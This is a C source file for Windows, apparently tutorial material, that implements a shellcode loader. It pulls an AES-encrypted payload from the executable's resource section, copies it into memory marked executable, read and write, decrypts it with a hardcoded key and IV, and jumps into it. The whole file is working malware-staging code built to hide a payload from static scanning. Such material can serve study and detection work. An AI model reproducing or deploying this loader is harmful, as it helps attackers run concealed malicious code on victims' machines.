#include <Windows.h>
#include <stdio.h>
#include "aes.h"
#include "resource.h"

// the Visual Studio project should include:
// aes.h - https://github.com/kokke/tiny-AES-c/blob/master/aes.h
// aes.c - https://github.com/kokke/tiny-AES-c/blob/master/aes.c

unsigned char pKey[] = {
		0x71, 0x83, 0x4E, 0xD6, 0xB5, 0x25, 0x5E, 0x08, 0x3C, 0x78, 0xEE, 0xF9, 0xC4, 0x0F, 0xD8, 0x6E,
		0x0E, 0x7C, 0xF7, 0x25, 0xEC, 0x12, 0xDC, 0xBB, 0x9C, 0xF0, 0xC2, 0xCD, 0x54, 0x3B, 0xC4, 0x5E
};

unsigned char pIv[] = {
		0xA8, 0x46, 0x99, 0xCA, 0xA9, 0xE7, 0x0D, 0xA5, 0xB5, 0x33, 0x1C, 0xE6, 0xED, 0xD7, 0x8B, 0xC9
};

// Print the input buffer as a hex char array
VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

	printf("unsigned char %s[] = {", Name);

	for (int i = 0; i < Size; i++) {
		if (i % 16 == 0) {
			printf("\n\t");
		}
		if (i < Size - 1) {
			printf("0x%0.2X, ", Data[i]);
		}
		else {
			printf("0x%0.2X ", Data[i]);
		}
	}

	printf("};\n\n\n");

}


int main() {

	HRSRC		hRsrc = NULL;
	HGLOBAL		hGlobal = NULL;
	PVOID		pPayloadAddress = NULL;
	SIZE_T		sPayloadSize = NULL;

	// Get the location to the data stored in .rsrc by its id *IDR_RCDATA1*
	hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	if (hRsrc == NULL) {
		// in case of function failure 
		printf("[!] FindResourceW Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get HGLOBAL, or the handle of the specified resource data since its required to call LockResource later
	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		// in case of function failure 
		printf("[!] LoadResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get the address of our payload in .rsrc section
	pPayloadAddress = LockResource(hGlobal);
	if (pPayloadAddress == NULL) {
		// in case of function failure 
		printf("[!] LockResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get the size of our payload in .rsrc section
	sPayloadSize = SizeofResource(NULL, hRsrc);
	if (sPayloadSize == NULL) {
		// in case of function failure 
		printf("[!] SizeofResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	PVOID Data = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (Data != NULL) {
		// copying the payload from resource section to the new buffer 
		memcpy(Data, pPayloadAddress, sPayloadSize);
	}
	else {
		// Error handling
		printf("[!] VirtualAlloc failed with error : %d \n", GetLastError());
		return -1;
	}

	// Struct needed for tiny-AES library
	struct AES_ctx ctx;

	// Initilizing the Tiny-Aes Library
	AES_init_ctx_iv(&ctx, pKey, pIv);

	printf("[i] Base Address of Encrypted Shellcode : 0x%p \n", Data);
	printf("[!] Decrypting shellcode..\n");

	// Decrypting
	AES_CBC_decrypt_buffer(&ctx, Data, sPayloadSize);

	printf("[!] Shellcode successfully decrypted!\n");

	// Printing the decrypted buffer to the console
	PrintHexData("PlainText", Data, sPayloadSize);

	// Declare a function pointer type that matches the shellcode signature
	typedef void (*ShellcodeFunction)();

	// Cast the executable buffer as a function pointer
	ShellcodeFunction shellcodeFunc = (ShellcodeFunction)Data;

	// Call the shellcode function
	shellcodeFunc();

	// freeing
	VirtualFree(Data, 0, MEM_RELEASE);
	return 0;

}
